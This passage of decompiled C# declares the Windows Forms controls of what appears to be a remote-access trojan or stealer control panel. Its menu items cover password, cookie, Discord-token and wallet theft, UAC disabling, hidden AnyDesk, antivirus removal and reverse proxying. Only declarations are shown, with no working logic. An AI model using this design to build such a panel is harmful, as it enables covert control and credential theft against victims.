		private global::System.Windows.Forms.ToolStripMenuItem restScaleToolStripMenuItem;

		// Token: 0x040000BC RID: 188
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem_1;

		// Token: 0x040000BD RID: 189
		private global::System.Windows.Forms.ToolStripMenuItem clipboardToolStripMenuItem;

		// Token: 0x040000BE RID: 190
		private global::System.Windows.Forms.ToolStripMenuItem setToolStripMenuItem;

		// Token: 0x040000BF RID: 191
		private global::System.Windows.Forms.ToolStripMenuItem getToolStripMenuItem;

		// Token: 0x040000C0 RID: 192
		private global::System.Windows.Forms.ToolStripMenuItem onkineToolStripMenuItem;

		// Token: 0x040000C1 RID: 193
		private global::System.Windows.Forms.ToolStripMenuItem offlineToolStripMenuItem;

		// Token: 0x040000C2 RID: 194
		private global::System.Windows.Forms.ToolStripMenuItem getscreenToolStripMenuItem;

		// Token: 0x040000C3 RID: 195
		private global::System.Windows.Forms.ToolStripMenuItem net35InstallToolStripMenuItem;

		// Token: 0x040000C4 RID: 196
		private global::System.Windows.Forms.ToolStripMenuItem avastRemovalToolStripMenuItem;

		// Token: 0x040000C5 RID: 197
		private global::System.Windows.Forms.ToolStripMenuItem webToolStripMenuItem;

		// Token: 0x040000C6 RID: 198
		private global::System.Windows.Forms.TabPage tabPage5;

		// Token: 0x040000C7 RID: 199
		private global::System.Windows.Forms.ImageList imageList1;

		// Token: 0x040000C8 RID: 200
		public global::System.Windows.Forms.ListBox listBox1;

		// Token: 0x040000C9 RID: 201
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

		// Token: 0x040000CA RID: 202
		private global::System.Windows.Forms.ToolStripMenuItem cLEARToolStripMenuItem1;

		// Token: 0x040000CB RID: 203
		public global::System.Windows.Forms.ColumnHeader lv_last;

		// Token: 0x040000CC RID: 204
		private global::System.Windows.Forms.ToolStripMenuItem killProcessToolStripMenuItem;

		// Token: 0x040000CD RID: 205
		private global::System.Windows.Forms.ToolStripMenuItem reverseProxyToolStripMenuItem;

		// Token: 0x040000CE RID: 206
		private global::System.Windows.Forms.ToolStripMenuItem startToolStripMenuItem1;

		// Token: 0x040000CF RID: 207
		private global::System.Windows.Forms.ToolStripMenuItem stopToolStripMenuItem3;

		// Token: 0x040000D0 RID: 208
		private global::System.Windows.Forms.ToolStripMenuItem gOTOToolStripMenuItem;

		// Token: 0x040000D1 RID: 209
		private global::System.Windows.Forms.ToolStripMenuItem gETLOGSToolStripMenuItem;

		// Token: 0x040000D2 RID: 210
		private global::System.Windows.Forms.ToolStripMenuItem backProxyUIToolStripMenuItem;

		// Token: 0x040000D3 RID: 211
		private global::System.Windows.Forms.ToolStripMenuItem toUACToolStripMenuItem;

		// Token: 0x040000D4 RID: 212
		private global::System.Windows.Forms.ToolStripMenuItem recoveryToolStripMenuItem;

		// Token: 0x040000D5 RID: 213
		private global::System.Windows.Forms.ToolStripMenuItem passwordRecoveryToolStripMenuItem2;

		// Token: 0x040000D6 RID: 214
		private global::System.Windows.Forms.ToolStripMenuItem dicordTokensToolStripMenuItem;

		// Token: 0x040000D7 RID: 215
		private global::System.Windows.Forms.ToolStripMenuItem disableUACToolStripMenuItem;

		// Token: 0x040000D8 RID: 216
		private global::System.Windows.Forms.ToolStripMenuItem showFolderToolStripMenuItem1;

		// Token: 0x040000D9 RID: 217
		private global::System.Windows.Forms.ToolStripMenuItem allInOneRecoveryToolStripMenuItem1;

		// Token: 0x040000DA RID: 218
		private global::System.Windows.Forms.ToolStripMenuItem desktopToolStripMenuItem;

		// Token: 0x040000DB RID: 219
		private global::System.Windows.Forms.ToolStripMenuItem hiddenAnydeskToolStripMenuItem;

		// Token: 0x040000DC RID: 220
		private global::System.Windows.Forms.ToolStripMenuItem webBrowserPassViewToolStripMenuItem;

		// Token: 0x040000DD RID: 221
		private global::System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem1;

		// Token: 0x040000DE RID: 222
		private global::System.Windows.Forms.ToolStripMenuItem fileManagerToolStripMenuItem1;

		// Token: 0x040000DF RID: 223
		private global::System.Windows.Forms.ToolStripMenuItem walletsToolStripMenuItem;

		// Token: 0x040000E0 RID: 224
		private global::System.Windows.Forms.ToolStripMenuItem walletsToolStripMenuItem1;

		// Token: 0x040000E1 RID: 225
		private global::System.Windows.Forms.ToolStripMenuItem searchToolStripMenuItem;

		// Token: 0x040000E2 RID: 226
		public global::System.Windows.Forms.ColumnHeader lv_os;

		// Token: 0x040000E3 RID: 227
		public global::System.Windows.Forms.ColumnHeader lv_av;

		// Token: 0x040000E4 RID: 228
		public global::System.Windows.Forms.ColumnHeader lv_ping;

		// Token: 0x040000E5 RID: 229
		private global::System.Windows.Forms.TabPage tabPage6;

		// Token: 0x040000E6 RID: 230
		public global::System.Windows.Forms.ListView listView5;

		// Token: 0x040000E7 RID: 231
		private global::System.Windows.Forms.ImageList imageList2;

		// Token: 0x040000E8 RID: 232
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStrip2;

		// Token: 0x040000E9 RID: 233
		private global::System.Windows.Forms.ToolStripMenuItem gOTOToolStripMenuItem1;

		// Token: 0x040000EA RID: 234
		private global::System.Windows.Forms.ToolStripMenuItem copyIDToolStripMenuItem;

		// Token: 0x040000EB RID: 235
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator3;

		// Token: 0x040000EC RID: 236
		private global::System.Windows.Forms.ToolStripMenuItem clearToolStripMenuItem2;

		// Token: 0x040000ED RID: 237
		private global::System.Windows.Forms.Timer timer1;

		// Token: 0x040000EE RID: 238
		public global::System.Windows.Forms.ColumnHeader columnHeader3;

		// Token: 0x040000EF RID: 239
		private global::System.Windows.Forms.ToolStripMenuItem searchHWIDToolStripMenuItem;

		// Token: 0x040000F0 RID: 240
		public global::System.Windows.Forms.ColumnHeader columnHeader7;

		// Token: 0x040000F1 RID: 241
		public global::System.Windows.Forms.ColumnHeader columnHeader9;

		// Token: 0x040000F2 RID: 242
		public global::System.Windows.Forms.ColumnHeader columnHeader10;

		// Token: 0x040000F3 RID: 243
		public global::System.Windows.Forms.ColumnHeader Wallet_ok;

		// Token: 0x040000F4 RID: 244
		public global::System.Windows.Forms.ColumnHeader lv_act;

		// Token: 0x040000F5 RID: 245
		public global::System.Windows.Forms.ColumnHeader columnHeader11;

		// Token: 0x040000F6 RID: 246
		public global::System.Windows.Forms.ColumnHeader columnHeader12;

		// Token: 0x040000F7 RID: 247
		public global::System.Windows.Forms.ColumnHeader columnHeader13;

		// Token: 0x040000F8 RID: 248
		public global::System.Windows.Forms.ColumnHeader columnHeader14;

		// Token: 0x040000F9 RID: 249
		public global::System.Windows.Forms.ColumnHeader columnHeader15;

		// Token: 0x040000FA RID: 250
		public global::System.Windows.Forms.ColumnHeader columnHeader16;

		// Token: 0x040000FB RID: 251
		public global::System.Windows.Forms.ColumnHeader columnHeader17;

		// Token: 0x040000FC RID: 252
		public global::System.Windows.Forms.ColumnHeader columnHeader18;

		// Token: 0x040000FD RID: 253
		public global::System.Windows.Forms.ColumnHeader columnHeader19;

		// Token: 0x040000FE RID: 254
		public global::System.Windows.Forms.ColumnHeader columnHeader20;

		// Token: 0x040000FF RID: 255
		public global::System.Windows.Forms.ColumnHeader columnHeader21;

		// Token: 0x04000100 RID: 256
		public global::System.Windows.Forms.ColumnHeader columnHeader22;

		// Token: 0x04000101 RID: 257
		public global::System.Windows.Forms.ColumnHeader columnHeader23;

		// Token: 0x04000102 RID: 258
		public global::System.Windows.Forms.ColumnHeader columnHeader24;

		// Token: 0x04000103 RID: 259
		public global::System.Windows.Forms.ColumnHeader columnHeader25;

		// Token: 0x04000104 RID: 260
		public global::System.Windows.Forms.ColumnHeader columnHeader26;

		// Token: 0x04000105 RID: 261
		public global::System.Windows.Forms.ColumnHeader columnHeader27;

		// Token: 0x04000106 RID: 262
		public global::System.Windows.Forms.ColumnHeader columnHeader28;

		// Token: 0x04000107 RID: 263
		public global::System.Windows.Forms.ColumnHeader columnHeader29;

		// Token: 0x04000108 RID: 264
		public global::System.Windows.Forms.ColumnHeader columnHeader30;

		// Token: 0x04000109 RID: 265
		public global::System.Windows.Forms.ColumnHeader columnHeader31;

		// Token: 0x0400010A RID: 266
		public global::System.Windows.Forms.ColumnHeader columnHeader32;

		// Token: 0x0400010B RID: 267
		public global::System.Windows.Forms.ColumnHeader columnHeader33;

		// Token: 0x0400010C RID: 268
		public global::System.Windows.Forms.ColumnHeader columnHeader6;

		// Token: 0x0400010D RID: 269
		public global::System.Windows.Forms.ColumnHeader columnHeader8;

		// Token: 0x0400010E RID: 270
		private global::System.Windows.Forms.ToolStripMenuItem fireFoxCookiesToolStripMenuItem;

		// Token: 0x0400010F RID: 271
		private global::System.Windows.Forms.ToolStripMenuItem chromiumCookiesToolStripMenuItem;

		// Token: 0x04000110 RID: 272
		private global::System.Windows.Forms.ToolStripMenuItem blockSiteToolStripMenuItem1;

		// Token: 0x04000111 RID: 273
		private global::System.Windows.Forms.ToolStripMenuItem blockToolStripMenuItem;

		// Token: 0x04000112 RID: 274
		private global::System.Windows.Forms.ToolStripMenuItem resetToolStripMenuItem;

		// Token: 0x04000113 RID: 275
		private global::System.Windows.Forms.ToolStripSeparator toolStripSeparator7;

		// Token: 0x04000114 RID: 276
		private global::System.Windows.Forms.ToolStripMenuItem settingsToolStripMenuItem;

		// Token: 0x04000115 RID: 277
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;

		// Token: 0x04000116 RID: 278
		public global::System.Windows.Forms.ColumnHeader lv_user;

		// Token: 0x04000117 RID: 279
		private global::System.Windows.Forms.ToolStripMenuItem saToolStripMenuItem;

		// Token: 0x04000118 RID: 280
		private global::System.Windows.Forms.ToolStripMenuItem backToolStripMenuItem;
	}
}
